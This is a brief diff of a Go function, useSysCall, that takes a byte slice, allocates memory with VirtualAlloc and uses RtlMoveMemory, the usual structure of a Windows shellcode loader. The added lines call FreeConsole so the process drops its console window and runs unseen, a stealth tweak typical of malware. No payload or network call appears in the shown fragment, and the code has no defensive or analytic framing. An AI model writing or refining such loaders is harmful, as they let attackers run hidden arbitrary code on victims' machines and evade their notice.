@@ -46,6 +46,9 @@ func useSysCall(sc []byte) {
 	kernel32 := windows.NewLazyDLL("kernel32.dll")
 	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
 
+	FreeConsole := syscall.NewLazyDLL("kernel32.dll").NewProc("FreeConsole")
+    FreeConsole.Call()
+
 	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil {
